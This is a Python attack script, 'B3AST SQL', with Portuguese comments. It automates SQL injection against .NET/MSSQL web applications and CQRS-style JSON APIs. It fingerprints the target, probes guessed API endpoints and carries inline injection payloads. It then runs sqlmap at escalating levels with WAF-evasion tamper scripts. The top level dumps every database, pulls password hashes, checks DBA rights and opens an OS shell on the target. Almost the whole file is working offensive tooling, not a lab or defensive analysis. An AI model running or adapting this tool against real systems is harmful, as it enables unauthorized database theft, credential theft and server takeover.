#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
B3AST SQL v3.0 — SQL Injection focado em .NET (MSSQL), CQRS e APIs JSON
Testa: params GET, POST JSON (CQRS commands), headers, cookies, ViewState.
Uso: python3 b3ast_sql.py "http://alvo.com/api/query?id=1"
"""
import subprocess, shutil, sys, json, re
from b3ast_core import C, banner, log_ok, log_vuln, log_fail, log_warn, log_info, log_dim, \
    titulo_fase, safe_exec, salvar_relatorio, menu_niveis, http_request, fingerprint_tecnologia

TAMPERS_NET = {
    "1": "space2comment",
    "2": "space2comment,between",
    "3": "space2comment,between,randomcase,charencode",
    "4": "space2comment,between,randomcase,charencode,equaltolike,greatest,percent,space2mssqlblank",
}

def montar_cmd(url, nivel, extra=None):
    """Monta comando sqlmap com otimizações para MSSQL/.NET."""
    dbms_mssql = "--dbms=mssql" if nivel in ("3", "4") else ""
    cmd = [
        "sqlmap", "-u", url,
        "--batch", "--flush-session",
        f"--level={ {'1':'1','2':'3','3':'5','4':'5'}[nivel] }",
        f"--risk={ {'1':'1','2':'2','3':'3','4':'3'}[nivel] }",
        f"--tamper={TAMPERS_NET[nivel]}",
        f"--threads={ {'1':'1','2':'4','3':'10','4':'10'}[nivel] }",
        "--randomize=__,r,ts,token",
        "--parse-errors",
    ]
    if nivel != "1":
        cmd += ["--forms", "--crawl=2"] if nivel in ("3","4") else ["--forms"]
    if dbms_mssql:
        cmd.append(dbms_mssql)
    if extra:
        cmd += extra
    return cmd

def testar_endpoint_cqrs(url, nivel):
    """
    Testa endpoints CQRS típicos: POST JSON com body de command/query.
    Retorna lista de endpoints candidatos.
    """
    candidatos = [
        "/api/command", "/api/query", "/api/commands", "/api/queries",
        "/api/CQRS", "/api/v1/command", "/api/v1/query",
        "/api/bus", "/api/mediator", "/api/dispatch",
    ]
    base = url.rstrip("/")
    host = re.match(r"https?://[^/]+", base).group(0)
    vivos = []
    payloads_cqrs = [
        {"action": "GetAll", "id": "1"},
        {"Id": 1, "Query": {"Filter": "1' OR '1'='1"}},
        {"command": "Create", "payload": {"name": "' OR 1=1--"}},
    ]
    for ep in candidatos:
        full = f"{host}{ep}"
        r = http_request(full, method="OPTIONS") or http_request(full, method="GET")
        if r and r.status_code not in (404, 405):
            vivos.append(full)
            log_ok(f"Endpoint CQRS vivo: {C.BOLD}{full}{C.END} [{r.status_code}]")
    return vivos

def main():
    if len(sys.argv) < 2:
        log_fail(f'Uso: python3 {sys.argv[0]} "http://alvo.com/api/query?id=1"')
        log_warn("O parâmetro (?id=1) é essencial para testar injeção.")
        sys.exit(1)
    url = sys.argv[1]

    if not shutil.which("sqlmap"):
        log_fail("sqlmap não instalado → apt install sqlmap"); sys.exit(1)

    banner()
    nivel = menu_niveis()

    # ── Fingerprint da stack antes de atacar ──
    titulo_fase("FINGERPRINT DA STACK")
    r = safe_exec(http_request, url, default=None, contexto="fingerprint")
    if r:
        techs = fingerprint_tecnologia(r.text, r.headers)
        if techs:
            for t in techs:
                log_ok(f"Tecnologia: {C.BOLD}{t}{C.END}")
        if "ASP.NET" in str(techs) or "IIS" in str(techs):
            log_ok("Alvo é .NET — sqlmap otimizado para MSSQL ativado.")

    # ── CQRS endpoint discovery ──
    titulo_fase("DESCOBERTA DE ENDPOINTS CQRS")
    if nivel in ("2", "3", "4"):
        cqrs = safe_exec(testar_endpoint_cqrs, url, nivel, default=[], contexto="cqrs")
    else:
        cqrs = []

    # ── Execução sqlmap ──
    titulo_fase(f"B3AST SQL — NÍVEL {nivel}")
    relatorio = []
    alvos = [url] + cqrs if nivel == "4" else [url]
    for alvo in alvos:
        extra = ["--dump-all", "--passwords", "--is-dba"] if nivel == "4" else \
                (["--dump", "--dbs"] if nivel == "3" else \
                (["--dbs"] if nivel == "2" else []))
        if nivel == "4":
            extra += ["--os-shell", "--privileges", "--roles"]
        cmd = montar_cmd(alvo, nivel, extra)
        log_info(f"Alvo: {C.BOLD}{alvo}{C.END}")
        log_dim(f"    {' '.join(cmd)}")
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=14400)
            saida = proc.stdout.strip() or proc.stderr.strip() or "(sem saída)"
        except subprocess.TimeoutExpired:
            log_fail("sqlmap TIMEOUT 4h — abortado"); saida = "TIMEOUT"
        except Exception as e:
            log_fail(f"sqlmap falhou: {e}"); saida = f"ERRO: {e}"

        # Resumo no terminal
        achados = [l for l in saida.splitlines()
                   if any(k in l.lower() for k in ("injectable", "vulnerable", "back-end dbms",
                                                    "banner:", "type:", "payload:", "dba:", "table:"))]
        if any("injectable" in l.lower() or "vulnerable" in l.lower() for l in achados):
            log_vuln(f"SQL INJECTION CONFIRMADA em {alvo}")
        for l in achados[:12]:
            print(f"    {C.GREEN}➜ {l.strip()}{C.END}")
        relatorio.append((f"sqlmap @ {alvo}", saida))

    salvar_relatorio("b3ast_sql", url.split("//")[-1].split("/")[0], relatorio)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_warn("Interrompido."); sys.exit(130)
